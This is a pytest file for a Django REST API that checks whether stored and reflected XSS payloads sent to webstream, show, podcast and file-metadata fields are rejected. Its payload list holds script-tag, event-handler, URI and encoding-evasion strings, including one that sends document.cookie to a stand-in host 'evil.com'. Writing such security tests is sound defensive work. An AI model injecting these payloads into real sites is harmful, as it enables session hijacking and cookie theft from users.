"""
XSS protection tests for stored XSS vulnerabilities.

Tests for:
- T521: Webstream MIME type stored XSS
- T525: Webstream description stored XSS
- T534: Webstream name stored XSS
- T535: Webstream description stored XSS
- T549: Webstream UPDATE name stored XSS
- T550: Webstream UPDATE description stored XSS
- T379: Show URL reflected XSS
- T380: Show description stored XSS
- T385: Show PATCH URL reflected XSS
- T386: Show PATCH description stored XSS
- T708: Podcast title stored XSS
- T709: Podcast description stored XSS
- T710: Podcast itunes_* fields stored XSS
- T732: Podcast UPDATE title stored XSS
- T733: Podcast PATCH description stored XSS
- T883: File metadata track_title stored XSS
"""

import json

import pytest

from model_bakery import baker
from rest_framework.test import APIClient

# XSS payloads for testing
XSS_PAYLOADS = [
    ("<script>alert(1)</script>", "basic_script"),
    ('<img src=x onerror="alert(1)">', "img_onerror"),
    ("javascript:alert(1)", "javascript_proto"),
    ('<svg onload="alert(1)">', "svg_onload"),
    ('<iframe src="javascript:alert(1)">', "iframe_js"),
    ('<body onload="alert(1)">', "body_onload"),
    ('"><script>alert(1)</script>', "quote_breakout"),
    ("'-'\"><script>alert(1)</script>", "complex_breakout"),
    ("<scr ipt>alert(1)</scr ipt>", "space_evasion"),
    (
        '<script>fetch("https://evil.com?c="+document.cookie)</script>',
        "data_exfil",
    ),
    ("<div onclick=alert(1)>click me</div>", "onclick_handler"),
    ("<a href=javascript:alert(1)>link</a>", "href_js"),
    ("<input onfocus=alert(1) autofocus>", "onfocus_handler"),
    (
        "<form onsubmit=alert(1)><button>Submit</button></form>",
        "onsubmit_handler",
    ),
    ("vbscript:msgbox(1)", "vbscript_proto"),
    ("data:text/html,<script>alert(1)</script>", "data_uri"),
    ("%3Cscript%3Ealert(1)%3C/script%3E", "url_encoded"),
    ("&#60;script&#62;alert(1)&#60;/script&#62;", "html_entity"),
]


class TestWebstreamXSSBlocked:
    """Test XSS protection in Webstream fields."""

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_create_webstream_name_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T534: XSS in name field should be blocked."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/webstreams",
            json.dumps(
                {
                    "name": f"Test {payload}",
                    "url": faker.url(),
                    "description": "Test description",
                },
            ),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_create_webstream_description_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T525, T535: XSS in description field should be blocked."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/webstreams",
            json.dumps(
                {
                    "name": f"Test Stream {faker.uuid4()[:8]}",
                    "url": faker.url(),
                    "description": payload,
                },
            ),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_create_webstream_mime_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T521: XSS in MIME type field should be blocked."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/webstreams",
            json.dumps(
                {
                    "name": f"Test Stream {faker.uuid4()[:8]}",
                    "url": faker.url(),
                    "description": "Test description",
                    "mime": payload,
                },
            ),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_update_webstream_name_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T549: XSS in name field on UPDATE should be blocked."""
        from api.schedule.models import Webstream

        webstream = baker.make(
            Webstream,
            name="Test Stream",
            url="http://example.com/stream",
            owner=admin_user,
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.patch(
            f"/api/v2/webstreams/{webstream.id}",
            json.dumps({"name": f"Test {payload}"}),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_update_webstream_description_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T550: XSS in description field on UPDATE should be blocked."""
        from api.schedule.models import Webstream

        webstream = baker.make(
            Webstream,
            name="Test Stream",
            url="http://example.com/stream",
            description="Original description",
            owner=admin_user,
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.patch(
            f"/api/v2/webstreams/{webstream.id}",
            json.dumps({"description": payload}),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"


class TestShowXSSBlocked:
    """Test XSS protection in Show fields."""

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_create_show_description_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T380: XSS in description field should be blocked."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/shows",
            json.dumps(
                {
                    "name": f"Test Show {faker.uuid4()[:8]}",
                    "description": payload,
                    "genre": "Music",
                    "background_color": "FFFFFF",
                    "foreground_color": "000000",
                    "linked": False,
                    "linkable": False,
                    "auto_playlist_enabled": False,
                    "auto_playlist_repeat": False,
                    "override_intro_playlist": False,
                    "override_outro_playlist": False,
                },
            ),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_create_show_url_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T379: XSS in URL field should be blocked."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/shows",
            json.dumps(
                {
                    "name": f"Test Show {faker.uuid4()[:8]}",
                    "description": "Test description",
                    "url": payload,
                    "genre": "Music",
                    "background_color": "FFFFFF",
                    "foreground_color": "000000",
                    "linked": False,
                    "linkable": False,
                    "auto_playlist_enabled": False,
                    "auto_playlist_repeat": False,
                    "override_intro_playlist": False,
                    "override_outro_playlist": False,
                },
            ),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_update_show_description_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T386: XSS in description field on PATCH should be blocked."""
        from api.schedule.models import Show

        show = baker.make(
            Show,
            name="Test Show",
            description="Original description",
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.patch(
            f"/api/v2/shows/{show.id}",
            json.dumps({"description": payload}),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_update_show_url_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T385: XSS in URL field on PATCH should be blocked."""
        from api.schedule.models import Show

        show = baker.make(
            Show,
            name="Test Show",
            url="http://example.com",
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.patch(
            f"/api/v2/shows/{show.id}",
            json.dumps({"url": payload}),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"


class TestPodcastXSSBlocked:
    """Test XSS protection in Podcast fields."""

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_create_podcast_title_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T708: XSS in title field should be blocked."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/podcasts",
            json.dumps(
                {
                    "title": f"Test {payload}",
                    "url": faker.url(),
                },
            ),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_create_podcast_description_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T709: XSS in description field should be blocked."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/podcasts",
            json.dumps(
                {
                    "title": f"Test Podcast {faker.uuid4()[:8]}",
                    "url": faker.url(),
                    "description": payload,
                },
            ),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_create_podcast_itunes_title_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T710: XSS in itunes_title field should be blocked."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/podcasts",
            json.dumps(
                {
                    "title": f"Test Podcast {faker.uuid4()[:8]}",
                    "url": faker.url(),
                    "itunes_title": payload,
                },
            ),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_update_podcast_title_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T732: XSS in title field on UPDATE should be blocked."""
        from api.podcasts.models import Podcast

        podcast = baker.make(
            Podcast,
            title="Test Podcast",
            url="http://example.com/feed",
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.patch(
            f"/api/v2/podcasts/{podcast.id}",
            json.dumps({"title": f"Test {payload}"}),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_update_podcast_description_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T733: XSS in description field on PATCH should be blocked."""
        from api.podcasts.models import Podcast

        podcast = baker.make(
            Podcast,
            title="Test Podcast",
            url="http://example.com/feed",
            description="Original description",
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.patch(
            f"/api/v2/podcasts/{podcast.id}",
            json.dumps({"description": payload}),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"


class TestFileMetadataXSSBlocked:
    """Test XSS protection in File metadata fields."""

    @pytest.mark.django_db
    @pytest.mark.parametrize("payload,test_name", XSS_PAYLOADS)
    def test_update_file_track_title_xss_blocked(
        self, admin_user, payload, test_name, faker,
    ):
        """T883: XSS in track_title field should be blocked."""
        from api.storage.models import File, Library

        library = baker.make(
            Library, name="Test Library", description="Test Desc",
        )
        file_obj = baker.make(
            File,
            name="test.mp3",
            filepath="test.mp3",
            mime="audio/mp3",
            library=library,
            track_title="Original Title",
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            json.dumps({"track_title": payload}),
            content_type="application/json",
        )
        assert response.status_code == 400, f"XSS not blocked: {test_name}"


class TestValidInputStillWorks:
    """Test that valid input still works after XSS protection."""

    @pytest.mark.django_db
    def test_create_webstream_valid_input(self, admin_user, faker):
        """Valid webstream data should still work."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/webstreams",
            json.dumps(
                {
                    "name": "Test Stream with <special> chars & symbols",
                    "url": faker.url(),
                    "description": "Test description with unicode: 日本語",
                },
            ),
            content_type="application/json",
        )
        assert response.status_code == 201

    @pytest.mark.django_db
    def test_create_podcast_valid_input(self, admin_user, faker):
        """Valid podcast data should still work."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/podcasts",
            json.dumps(
                {
                    "title": "Test Podcast with <special> chars & symbols",
                    "url": faker.url(),
                    "description": "Test description with unicode: 日本語",
                },
            ),
            content_type="application/json",
        )
        assert response.status_code == 201
